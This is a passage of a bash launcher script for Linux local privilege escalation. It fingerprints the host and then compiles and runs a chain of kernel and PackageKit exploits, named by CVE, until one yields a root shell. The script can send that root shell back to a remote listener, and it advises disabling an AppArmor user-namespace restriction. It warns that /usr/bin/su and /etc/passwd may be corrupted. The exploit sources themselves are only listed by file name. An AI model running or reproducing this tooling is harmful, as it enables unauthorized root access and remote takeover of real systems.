DISTRO="unknown"
[ -r /etc/os-release ] && DISTRO=$(. /etc/os-release; echo "${PRETTY_NAME:-unknown}")
USER_UID=$(id -u); USER_NAME=$(id -un)
SU_PATH=""; for p in /usr/bin/su /bin/su; do [ -f "$p" ] && { SU_PATH=$p; break; }; done
HAVE_GCC=no;   command -v gcc  >/dev/null 2>&1 && HAVE_GCC=yes
HAVE_CC=no;    command -v cc   >/dev/null 2>&1 && HAVE_CC=yes
HAVE_PY=no;    command -v python3 >/dev/null 2>&1 && HAVE_PY=yes
HAVE_GI=no;    [ "$HAVE_PY" = yes ] && python3 -c 'import gi' >/dev/null 2>&1 && HAVE_GI=yes
USERNSS=no;    unshare --user --map-root-user true >/dev/null 2>&1 && USERNSS=yes
APPARMOR=0;    [ -r /proc/sys/kernel/apparmor_restrict_unprivileged_userns ] && APPARMOR=$(cat /proc/sys/kernel/apparmor_restrict_unprivileged_userns)
IOURING=unknown; [ -r /proc/sys/kernel/io_uring_disabled ] && IOURING=$(cat /proc/sys/kernel/io_uring_disabled)
AFALG=no;      [ -r /proc/crypto ] && grep -q af_alg /proc/crypto 2>/dev/null && AFALG=yes
PK_KIT=no;     command -v packagekitd >/dev/null 2>&1 && PK_KIT=yes
[ "$PK_KIT" = no ] && pgrep -x packagekitd >/dev/null 2>&1 && PK_KIT=yes

# ---- print scan ----
info "==== scan: $HOSTNAME ===="
say  "  host    : $HOSTNAME"
say  "  arch    : $ARCH        (target id: $ARCH_ID)"
say  "  kernel  : $KERNEL"
say  "  distro  : $DISTRO"
say  "  user    : $USER_NAME (uid=$USER_UID) $([ "$HAS_ROOT" = 1 ] && echo '[ALREADY ROOT]' || echo '[unprivileged]')"
say  "  tools   : gcc=$HAVE_GCC cc=$HAVE_CC python3=$HAVE_PY python3-gi=$HAVE_GI"
say  "  su path : ${SU_PATH:-none}"
say  "  userns  : $USERNSS  (unprivileged user+netns)"
say  "  apparmor unpriv userns restrict: $APPARMOR"
say  "  io_uring_disabled: $IOURING"
say  "  AF_ALG  : $AFALG"
say  "  PackageKit: $PK_KIT"

# ---- candidate selection ----
cands=()
add_cand() { for c in "$@"; do cands+=("$c"); done; }
if [ "$ARCH_ID" = x86_64 ]; then
    add_cand 01 02 03 05 07
    [ "$PK_KIT" = yes ] && add_cand 06
elif [ "$ARCH_ID" = aarch64 ]; then
    add_cand 04
    [ "$PK_KIT" = yes ] && add_cand 06
else
    [ "$PK_KIT" = yes ] && add_cand 06
fi
# keep only requested exploit if --exploit given
if [ -n "$ONLY" ]; then
    cands=("$ONLY")
fi

info "==== candidates: ${cands[*]:-none} ===="
for c in "${cands[@]}"; do
    case "$c" in
        01) say "  [01] CVE-2026-46331  act_pedit COW          $( [ "$USERNSS" = yes ] && echo ok || echo "needs unpriv userns" )" ;;
        02) say "  [02] CVE-2026-43494  io_uring RDS pin-theft $( [ "$IOURING" != "1" ] && echo ok || echo "io_uring disabled" )" ;;
        03) say "  [03] Fragnesia       ESP-in-TCP page-cache $( [ "$USERNSS" = yes ] && echo ok || echo "needs unpriv userns" )" ;;
        04) say "  [04] dirtyfrag (arm64) XFRM-ESP/rxrpc       ok" ;;
        05) say "  [05] dirtyfrag (x86_64) XFRM-ESP/rxrpc      ok" ;;
        06) say "  [06] CVE-2026-41651 PackageKit TOCTOU      $( [ "$HAVE_GI" = yes ] && echo ok || echo "needs python3-gi" )" ;;
        07) say "  [07] CVE-2026-31431 copy_fail AF_ALG        $( [ "$AFALG" = yes ] && echo ok || echo "needs AF_ALG" )" ;;
    esac
done

if [ "$HAS_ROOT" = 1 ]; then
    warn "you are already root - LPE is pointless."
fi
if [ "$SCAN_ONLY" = 1 ] || [ "$HAS_ROOT" = 1 ] || [ "$USER_UID" = 0 ]; then
    [ "$SCAN_ONLY" = 1 ] && ok "scan complete (scan-only mode)"
    exit 0
fi

# ---- compile ----
compile_one() {
    local id="$1"; local src="$2"; local out="$3"; local cmd
    [ -f "$SRCDIR/$src" ] || { err "[$id] source missing"; return 1; }
    case "$id" in
        01) cmd="gcc -O2 -o $out $src" ;;
        02) cmd="gcc -O2 -o $out $src" ;;
        03) cmd="gcc -O2 -static -o $out $src 2>/dev/null || gcc -O2 -o $out $src" ;;
        04) cmd="gcc -O2 -o $out $src" ;;
        05) cmd="gcc -O2 -o $out $src" ;;
    esac
    if (cd "$SRCDIR" && eval "$cmd"); then
        chmod +x "$out" 2>/dev/null || true
        ok "[$id] built -> $(basename "$out")"
        return 0
    fi
    err "[$id] build failed"
    return 1
}

declare -A built
for c in "${cands[@]}"; do
    case "$c" in
        01) compile_one 01 src_01.c "$BINDIR/x01" && built[01]=1 ;;
        02) compile_one 02 src_02.c "$BINDIR/x02" && built[02]=1 ;;
        03) compile_one 03 src_03.c "$BINDIR/x03" && built[03]=1 ;;
        04) compile_one 04 src_04.c "$BINDIR/x04" && built[04]=1 ;;
        05) compile_one 05 src_05.c "$BINDIR/x05" && built[05]=1 ;;
        06) built[06]=1 ;;
        07) built[07]=1 ;;
    esac
done

if [ "$BUILD_ONLY" = 1 ]; then
    ok "build-only mode: binaries built (no exploit executed)"
    exit 0
fi

# ---- run ----
WON=0
run_one() {
    local id="$1" name="$2"; shift 2
    [ "${built[$id]:-0}" = 1 ] || { err "[$id] not available"; return; }
    local log="$LOGDIR/$id.log"
    info "==== [$id] $name ===="
    # feed the root shell a command + exit; capture everything
    local feed="id; exit"
    if [ "$REVSHELL" = 1 ]; then
        feed="id; $(rh_cmd "$RHOST" "$RPORT")"
        warn "[$id] root shell nanti akan KONEK BALIK ke ${RHOST}:${RPORT} (pastikan listener sudah jalan)"
        warn "[$id] kalau LPE gagal dapat root, tidak ada yang dikirim -> ini biasanya penyebab 'ga run apa apa'"
    fi
    # stream live to screen while also keeping the log
    printf '%s\n' "$feed" | (cd "$WORKDIR" && timeout "$EXPLOIT_TIMEOUT" "$@") 2>&1 | tee "$log"
    local rc=${PIPESTATUS[1]}
    if grep -qaE 'uid=0\(' "$log"; then
        ok "[$id] $name -> ROOT SHELL achieved (uid=0)"
        [ "$REVSHELL" = 1 ] && say "   revershell terkirim ke ${RHOST}:${RPORT}; cek listener Anda"
        WON=1
        return 0
    fi
    warn "[$id] belum dapat root (rc=$rc) - log: $log"
    return 1
}

for c in "${cands[@]}"; do
    case "$c" in
        01) run_one 01 "CVE-2026-46331" "$BINDIR/x01" ;;
        02) run_one 02 "CVE-2026-43494" "$BINDIR/x02" ;;
        03) run_one 03 "Fragnesia"       "$BINDIR/x03" ;;
        04) run_one 04 "dirtyfrag-arm64" "$BINDIR/x04" -v ;;
        05) run_one 05 "dirtyfrag-x86_64" "$BINDIR/x05" -v ;;
        06) run_one 06 "CVE-2026-41651" python3 "$SRCDIR/src_06.py" ;;
        07) run_one 07 "CVE-2026-31431" python3 "$SRCDIR/src_07.py" ;;
    esac
    [ "$WON" = 1 ] && break
done

# ---- summary ----
echo
if [ "$WON" = 1 ]; then
    ok "=== PRIVILEGE ESCALATION SUCCEEDED ==="
    say "  run:  $( [ -n "$ONLY" ] && echo "$ONLY" || echo "see log" )"
else
    err "=== no exploit succeeded on this host ==="
    say "  logs: $LOGDIR"
    if [ "$REVSHELL" = 1 ]; then
        warn "  --revshell hanya mengirim koneksi setelah ROOT SHELL didapat."
        warn "  Kalau 'ga run apa-apa' di listener, berarti LPE-nya gagal dapat root."
        warn "  Coba dulu tanpa --revshell:  ./lpe_all.sh   (lihat apakah ada uid=0)"
    fi
    say "  hint: unpriv userns = $USERNSS; apparmor userns restrict = $APPARMOR"
    say "        (on Ubuntu with AppArmor, try: sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0)"
    say "        then re-run the kernel-exploit candidates."
fi
say
warn "cleanup note: page-cache corruption of /usr/bin/su clears on reboot or"
warn "  'echo 3 > /proc/sys/vm/drop_caches' (as root). If dirtyfrag used the"
warn "  rxrpc path it may have edited /etc/passwd on disk - inspect and revert it."
[ "$KEEP" = 0 ] && rm -rf "$WORKDIR" && ok "workspace cleaned"

exit $([ "$WON" = 1 ] && echo 0 || echo 1)
__PAYLOAD_BELOW__
src_01.c 
src_02.c 
src_03.c 
src_04.c 
src_05.c 
src_06.py 
src_07.py 
